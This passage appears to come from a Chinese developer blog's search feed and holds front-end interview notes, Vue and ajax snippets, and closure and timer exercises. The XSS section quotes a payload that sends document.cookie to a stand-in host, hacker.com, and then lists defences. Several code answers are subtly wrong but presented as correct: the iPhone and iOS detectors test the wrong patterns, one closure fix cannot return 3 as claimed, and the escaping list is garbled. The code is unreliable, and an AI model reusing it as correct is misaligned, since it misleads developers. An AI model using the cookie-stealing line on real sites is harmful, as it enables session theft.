的双向绑定是如何实现的？有什么缺点？<br>看文档，深入响应式原理<br>Computed 计算属性的用法？跟 Methods 的区别。<br><a href="https://zhuanlan.zhihu.com/p/33778594" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/33778594</a><br>算法押题</p><p>排序算法（背诵冒泡排序、选择排序、计数排序、快速排序、插入排序、归并排序）<br>二分查找法<br>翻转二叉树<br>把上面三个背一下，算法题必过。</p><p>安全押题</p><p>什么是 XSS 攻击？如何预防？<br>举例<br>  div.innerHTML = userComment  // userComment 内容是 <script>$.get('<a href="http://hacker.com?cookie=&#39;+document.cookie" target="_blank" rel="noopener">http://hacker.com?cookie=&#39;+document.cookie</a>)</script><br>  // 恶意就被执行了，这就是 XSS<br>预防<br>不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行<br>如果你一样要用 innerHTML，字符过滤<br>把 &lt; 替换成 &lt;<br>把 &gt; 替换成 &gt;<br>把 &amp; 替换成 &amp;<br>把 ‘ 替换成 '<br>把 ‘ 替换成 "<br>代码 div.innerHTML = userComment.replace(/&gt;/g, ‘&lt;’).replace…<br>使用 CSP Content Security Policy<br>什么是 CSRF 攻击？如何预防？<br>过程<br>用户在 qq.com 登录<br>用户切换到 hacker.com（恶意网站）<br>hacker.com 发送一个 qq.com/add_friend 请求，让当前用户添加 hacker 为好友。<br>用户在不知不觉中添加 hacker 为好友。<br>用户没有想发这个请求，但是 hacker 伪造了用户发请求的假象。<br>避免<br>检查 referer，qq.com 可以拒绝来自 hacker.com 的请求<br>csrf_token 来解决<br>Webpack 题</p><p>转译出的文件过大怎么办？<br>使用 code split<br>写法 import(‘xxx’).then(xxx=&gt;{console.log(xxx)})<br>xxx 模块就是按需加载的<br>转译速度慢什么办？<br>方方不会。<br>写过 webpack loader 吗？<br><a href="http://www.alloyteam.com/2016/01/webpack-loader-1/" target="_blank" rel="noopener">http://www.alloyteam.com/2016/01/webpack-loader-1/</a><br>发散题</p><p>从输入 URL 到页面展现中间发生了什么？<br>DNS 查询 DNS 缓存<br>建立 TCP 连接（三次握手）连接复用<br>发送 HTTP 请求（请求的四部分）<br>后台处理请求<br>监听 80 端口<br>路由<br>渲染 HTML 模板<br>生成响应<br>发送 HTTP 响应<br>关闭 TCP 连接（四次挥手）<br>解析 HTML<br>下载 CSS（缓存<br>解析 CSS<br>下载 JS（缓存<br>解析 JS<br>下载图片<br>解析图片<br>渲染 DOM 树<br>渲染样式树<br>执行 JS<br>你没有工作经历吗？</p><p>一开始就问，可以拜拜。<br>中间问最后问，他想压价。<br>解法：用项目打动它：你看下我的作品，跟一年经验的前端差距大吗？你们团队一年工作经验的前端，写的出来我这样的作品吗？凭我的作品，我觉得我可以胜任贵司的工作。<br>你遇到过最难的问题是什么？<br><a href="https://www.zhihu.com/question/35323603/answer/338796153" target="_blank" rel="noopener">https://www.zhihu.com/question/35323603/answer/338796153</a></p><p>你的期望薪资是多少？<br>你想要的工资 加 1000~2000。<br>（任何你不会的问题）<br>承认不会<br>询问详细细节：你问的是不是XXX方面的知识？请问你想问的是哪方面知识？<br>根据面试官的回答，向有利于自己的方向引导话题。<br>刁钻代码题</p><p>map加parseInt</p><p> [1,2,3].map(parseInt)</p><p> parseInt(1,0, array) // 1<br> parseInt(2,1, array) // NaN<br> parseInt(3,2, array) // NaN<br>a.x = a = {}<br> var a = {n:1};<br> var b = a;<br> a.x = a = {n:2};<br>问 a.x 是多少？<br>(a ==1 &amp;&amp; a== 2 &amp;&amp; a==3) 可能为 true 吗？<br>a = {<br>  value: 0,<br>  toString(){<br>    a.value += 1<br>    return a.value<br>  }<br>}</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue笔记</title>
      <link href="/2018/04/04/vue-bi-ji/"/>
      <url>/2018/04/04/vue-bi-ji/</url>
      
        <content type="html"><![CDATA[<ol><li>确保组件在Vue实例化之前注册<br>即在 new Vue之前 先进行 Vue.component</li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue 初探</title>
      <link href="/2018/03/25/vue-chu-tan/"/>
      <url>/2018/03/25/vue-chu-tan/</url>
      
        <content type="html"><![CDATA[<p><a href="http://jsbin.com/sogexasuti/edit?html,js,output" target="_blank" rel="noopener">axios初次使用</a></p><p><a href="http://jsbin.com/hawuzerori/1/edit?css,js,output" target="_blank" rel="noopener">Vue slides轮播雏形</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>dom</title>
      <link href="/2018/02/24/dom/"/>
      <url>/2018/02/24/dom/</url>
      
        <content type="html"><![CDATA[<p>阻止冒泡事件： stopPropagation()<br>会产生BUG，使得IE8中的checkbox点击不到<br><a href="http://js.jirengu.com/pujupepoye/1/edit?html,css,js,output" target="_blank" rel="noopener">http://js.jirengu.com/pujupepoye/1/edit?html,css,js,output</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ajax</title>
      <link href="/2018/02/23/ajax/"/>
      <url>/2018/02/23/ajax/</url>
      
        <content type="html"><![CDATA[<p>#自己用原生js写一个ajax，必须包含XMLHttpRequest</p><pre><code> let request = new XMLHttpRequest()  request.open('get', '/xxx') // 配置request  request.send()  request.onreadystatechange = ()=&gt;{    if(request.readyState === 4){       if(request.status &gt;= 200 &amp;&amp; request.status &lt; 300){        console.log('说明请求成功')      }else if(request.status &gt;= 400){        console.log('说明请求失败')       }    }  }</code></pre><p>#按照课堂上的思路，封装一个 jQuery.ajax，满足jQuery.ajax(url,method,body,success, fail)满足这种 API。</p><pre><code>window.jQuery = function(nodeOrSelector){  let nodes = {}  nodes.addClass = function(){}  nodes.html = function(){}  return nodes}window.$ = window.jQuerywindow.jQuery.ajax = function({url, method, body, successFn, failFn, headers}){  let request = new XMLHttpRequest()  request.open(method, url) // 配置request  for(let key in headers) {    let value = headers[key]    request.setRequestHeader(key, value)  }  request.onreadystatechange = ()=&gt;{    if(request.readyState === 4){      if(request.status &gt;= 200 &amp;&amp; request.status &lt; 300){        successFn.call(undefined, request.responseText)      }else if(request.status &gt;= 400){        failFn.call(undefined, request)      }    }  }  request.send(body)}function f1(responseText){}function f2(responseText){}myButton.addEventListener('click', (e)=&gt;{  window.jQuery.ajax({    url: '/frank',    method: 'get',    headers: {      'content-type':'application/x-www-form-urlencoded',      'frank': '18'    },    successFn: (x)=&gt;{      f1.call(undefined,x)      f2.call(undefined,x)    },    failFn: (x)=&gt;{      console.log(x)      console.log(x.status)      console.log(x.responseText)    }  })})</code></pre><p>#升级你的 jQuery.ajax 满足 Promise 规则</p><pre><code>window.jQuery = function(nodeOrSelector){  let nodes = {}  nodes.addClass = function(){}  nodes.html = function(){}  return nodes}window.$ = window.jQuerywindow.Promise = function(fn){  // ...  return {    then: function(){}  }}window.jQuery.ajax = function({url, method, body, headers}){  return new Promise(function(resolve, reject){    let request = new XMLHttpRequest()    request.open(method, url) // 配置request    for(let key in headers) {      let value = headers[key]      request.setRequestHeader(key, value)    }    request.onreadystatechange = ()=&gt;{      if(request.readyState === 4){        if(request.status &gt;= 200 &amp;&amp; request.status &lt; 300){          resolve.call(undefined, request.responseText)        }else if(request.status &gt;= 400){          reject.call(undefined, request)        }      }    }    request.send(body)  })}myButton.addEventListener('click', (e)=&gt;{  let promise = window.jQuery.ajax({    url: '/xxx',    method: 'get',    headers: {      'content-type':'application/x-www-form-urlencoded',      'frank': '18'    }  })  promise.then(    (text)=&gt;{console.log(text)},    (request)=&gt;{console.log(request)}  )})</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>闭包、定时器、BOM###</title>
      <link href="/2017/12/26/bi-bao-ding-shi-qi-bom/"/>
      <url>/2017/12/26/bi-bao-ding-shi-qi-bom/</url>
      
        <content type="html"><![CDATA[<p>#题目1: 下面的代码输出多少？修改代码让 fnArr<a href="">i</a> 输出 i。使用 两种以上的方法</p><pre><code>    var fnArr = [];    for (var i = 0; i &lt; 10; i ++) {        fnArr[i] =  function(){            return i;        };    }    console.log( fnArr[3]() );  //输出为10</code></pre><pre><code>    //  第一种方法    var fnArr = [];    for (var i = 0; i &lt; 10; i ++) {        var fn = fnArr[i] =  !function(i){            return fn1;            function fn1(){                return i;            }        }(i);        fnArr[i] = fn;    }    console.log( fnArr[3]() );  // 输出3</code></pre><pre><code>    //    第二种方法    var fnArr = [];    for (var i = 0; i &lt; 10; i ++) {        var fn = function(i) {            var fn1 = function() {                return i;            }            fnArr[i] =  fn1;        }        fn(i);    }    console.log( fnArr[3]() );  //输出3</code></pre><p>#题目2： 封装一个汽车对象，可以通过如下方式获取汽车状态</p><pre><code>var Car = (function(){   var speed = 0;   function setSpeed(s){       speed = s   }   function getSpeed(s){           return speed;   }   function accelerate(){           speed += 10;   }   function decelerate() {       // 速度 &lt; 10 减速为 0;       if (speed &lt; 10) {           speed = 0;       } else {           speed -= 10;       }    }   function getStatus() {       if (speed &gt; 0) {           return 'running';       } else {           return 'stop';       }    }   return {      setSpeed: setSpeed,      getSpeed: getSpeed,      accelerate: accelerate,      decelerate: decelerate,      getStatus: getStatus   }})()Car.setSpeed(30);Car.getSpeed(); //30Car.accelerate();Car.getSpeed(); //40;Car.decelerate();Car.decelerate();Car.getSpeed(); //20Car.getStatus(); // 'running';Car.decelerate(); Car.decelerate();Car.getStatus();  //'stop';//Car.speed;  //error</code></pre><p>#题目3：下面这段代码输出结果是? 为什么?</p><pre><code>var a = 1;setTimeout(function(){    a = 2;    console.log(a);}, 0);var a ;console.log(a);a = 3;console.log(a);// 输出为1，3，2// setTimeout中的函数会被异步调用，等到执行栈中的代码执行完成后// 声明a 并赋值为1，所以代码第7行输出为1// 重新给a赋值为3，所以代码第9行输出为3// 执行栈中的代码执行完毕，开始执行setTimeout，这时给a赋值为2，输出为2</code></pre><p>#题目4：下面这段代码输出结果是? 为什么?</p><pre><code>var flag = true;setTimeout(function(){    flag = false;},0)while(flag){}console.log(flag);// 没有结果，也没有返回值。// setTimeout中函数会等到执行栈中的代码运行结束后再执行，但由于一直处于循环体内，所以不会执行到后面的console.log</code></pre><p>#题目5： 下面这段代码输出？如何输出delayer: 0, delayer:1…（使用闭包来实现）</p><pre><code>for(var i=0;i&lt;5;i++){    setTimeout(function(){         console.log('delayer:' + i );    }, 0);    console.log(i);}</code></pre><pre><code>    //    方法for (var i = 0; i &lt; 5; i++) {    var t1 = function (i) {        return function(){            console.log('delayer:' + i);        }    }    setTimeout(t1(i), 0);    console.log(i);}for (var i = 0; i &lt; 5; i++) {    setTimeout((function (i) {        return function(){            console.log('delayer:' + i);        }    })(i), 0);    console.log(i);}</code></pre><p>#题目6： 如何获取元素的真实宽高</p><pre><code>div {    width: 500px;    height: 200px;}var div = document.querySelector('div')function getStyle(el){    var realSize = {}    if(window.getComputedStyle){        realSize.width = window.getComputedStyle(el,null).width        realSize.height = window.getComputedStyle(el,null).height    }else{        realSize.width = el.currentStyle.width        realSize.height = el.currentStyle.height    }    return realSize}getStyle(div) //{width: "500px", height: "200px"}</code></pre><p>#题目7： URL 如何编码解码？为什么要编码？</p><ul><li><p>URL的编码格式采用的是ASCII码，而不是Unicode，也就是说URL只能使用英文字母、阿拉伯数字和某些标点符号，不能使用其他文字和符号。如果URL中有汉字，就必须编码后使用，否则服务器有可能出现解析错误。</p></li><li><p>两种编码方式</p></li></ul><ol><li><p>encodeURI()</p></li><li><p>encodeURIComponent()</p></li></ol><ul><li>两种解码方式 </li></ul><ol><li><p>decodeURI()</p></li><li><p>decodeURIComponent() </p></li></ol><p>#题目8： 补全如下函数，判断用户的浏览器类型</p><pre><code>function isAndroid(){    return /android/i.test(navigator.userAgent);}function isIphone(){    return /android/i.test(navigator.userAgent);}function isIpad(){    return /ipad/i.test(navigator.userAgent);}function isIOS(){    return /ipad/i.test(navigator.userAgent);}</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
